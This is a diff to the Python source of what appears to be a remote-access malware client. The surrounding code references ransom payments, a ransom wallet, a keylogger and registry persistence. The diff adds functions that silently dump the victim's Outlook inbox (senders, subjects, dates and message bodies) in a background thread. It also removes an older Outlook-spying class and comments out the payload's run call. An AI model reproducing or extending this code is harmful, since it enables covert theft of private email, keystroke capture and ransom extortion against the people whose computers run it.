@@ -82,7 +82,7 @@ from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
 if os.name is 'nt':
     import win32com.client
     from pyHook import HookManager
-    from pythoncom import PumpMessages
+    from pythoncom import PumpMessages, CoInitialize
     from win32com.shell.shell import ShellExecuteEx
     from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
 else:
@@ -614,7 +614,7 @@ class Client(object):
             else:
                 return "{} does not yet support {} platform".format(Client._ransom_payment.func_name, sys.platform)
         except Exception as e:
-            e = "{} error: {}".format(Client._ransom_payment.func_name, str(e)))
+            e = "{} error: {}".format(Client._ransom_payment.func_name, str(e))
             Client.debug(e)
             return e
 
@@ -668,6 +668,38 @@ class Client(object):
             return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_wallet_address.func_name, str(e)))
+
+
+    def _email_dump(self, *args, **kwargs):
+        CoInitialize()
+        outlook = win32com.client.Dispatch("Outlook.Application").GetNameSpace('MAPI')
+        inbox   = outlook.GetDefaultFolder(6)
+        emails  = inbox.Items
+        n       = len(emails) if not Client._debug else 10
+        i       = 0
+        while i < n:
+            try:
+                email    = emails.GetNext()
+                sender   = email.SenderEmailAddress.encode('ascii','ignore')
+                message  = email.Body.encode('ascii','ignore')[:150] + '...'
+                subject  = email.Subject.encode('ascii','ignore')
+                received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
+                result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
+                self.email.inbox[i] = result
+                i += 1
+                if i >= n:
+                    break
+            except Exception as e:
+                self.debug("{} error: {}".format(self._email_dump.func_name, str(e)))
+                break
+
+
+    def _email_read(self, *args, **kwargs):
+        try:
+            max_len  = "{:<%d}" % int(max([len(str(i)) for i in self.email.inbox.keys()]) + 2)
+            return json.dumps({max_len.format(k): v for k,v in self.email.inbox.items()},  indent=2)
+        except Exception as e:
+            self.debug("{} error: {}".format(self._email_read.func_name, str(e)))
 
 
     def _keylogger(self, *args, **kwargs):
@@ -1936,27 +1968,28 @@ class Client(object):
             sys.exit() if not Client._debug else exit()
 
 
-    @config(platforms=['win32','darwin'], command=True, usage='email <option>')
+    @config(platforms=['win32','darwin'], inbox={}, command=True, usage='email <option>')
     def email(self, args=None):
         """
         access user's Outlook email in the background
         """       
         try:
-            if not Outlook.installed():
-                return "Outlook application could not be found"
+            if not args:
+                self._jobs[self._email_dump.func_name] = threading.Thread(target=self._email_dump, name=time.time())
+                self._jobs[self._email_dump.func_name].daemon = True
+                self._jobs[self._email_dump.func_name].start()
+                return "Dumping Outlook inbox"
             else:
-                if not isinstance(self._email, Outlook):
-                    self._email = Outlook()
-                elif not args:
-                    return json.dumps(Outlook.help())
-                else:
+                try:
                     mode, _, arg   = str(args).partition(' ')
-                    if not hasattr(self._email, mode):
-                        return json.dumps(Outlook.help())
+                    if hasattr(self, '_email_%s' % mode):
+                        return getattr(self, '_email_%s' % mode)(arg) if arg else getattr(self, '_email_%s' % mode)()
                     else:
-                        return getattr(self._email, mode)(arg) if arg else getattr(self._email, mode)()
-        except Exception as e2:
-            self.debug("{} error: {}".format(self.email.func_name, str(e2)))
+                        return "{} error: invalid option '{}'\nemail options: read, search".format(self.email.func_name, mode)
+                except Exception as e:
+                    return "{} error: {}".format(self.email.func_name, str(e))
+        except:
+            return "Outlook not installed on this host"
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <mode> [path]')
@@ -2367,89 +2400,8 @@ def main(*args, **kwargs):
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version)
     finally:
         payload = Client(**kwargs)
-        payload.run()
+        #payload.run()
         return payload
-
-
-
-class Outlook(threading.Thread):
-    
-    options = {
-        "help"              : "show this usage help menu",
-        "installed"         : "check if Outlook is installed on host device",
-        "read [integer]"    : "read emails [default: 1]",
-        "search <string>"   : "search the user's emails for words/phrases [separator: ',']"
-    }
-                
-    def __init__(self, *args, **kwargs):
-        super(Outlook, self).__init__()
-        self._debug = kwargs.get('debug')
-        self._lock  = kwargs.get('lock')
-        self.mapi   = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
-        self.inbox  = self.mapi.GetDefaultFolder(6)
-        self.items  = self.inbox.Items
-        self.emails = {}
-
-                
-    @staticmethod
-    def installed(*args, **kwargs):
-        try:
-            if win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI'):
-                return True
-        except: pass
-        return False
-
-
-    @staticmethod
-    def help(*args, **kwargs):
-        return Outlook.options
-
-
-    def debug(self, data):
-        if self._debug and self._lock:
-            with self._lock:
-                try:
-                    print(bytes(data))
-                except Exception as e:
-                    print("{} error: {}".format(self.debug.func_name, str(e)))
-
-
-    def dump_inbox(self, n):
-        n = 1 if bool(not n or not str(n).isdigit()) else int(n) 
-        i = 0
-        while i < n:
-            try:
-                email = self.items.GetNext()
-                sender   = email.SenderEmailAddress.encode('ascii','ignore')
-                message  = email.Body.encode('ascii','ignore')[:150] + '...'
-                subject  = email.Subject.encode('ascii','ignore')
-                received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
-                result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
-                self.emails[i] = result
-                i += 1
-                if int(i) >= int(n):
-                    break
-            except Exception as e:
-                self.debug("{} error: {}".format(self.dump.func_name, str(e)))
-        return "Dumped %d emails from Outlook to email" % int(n)
-
-
-    def read(self, *args, **kwargs):
-        try:
-            output = []
-            for email in self.emails:
-                max_len  = "{:<%d}" % int(max([len(i) for i in email.keys()]) + 2)
-                output.append(json.dumps({max_len.format(k): v for k,v in email.items()},  indent=2))
-            return '\n'.join(output)
-        except Exception as e:
-            self.debug("{} error: {}".format(self.dump.func_name, str(e)))
-
-
-    def run(self):
-        t = threading.Thread(targete=self.dump_inbox)
-        t.daemon = True
-        t.start()
-
 
 
 
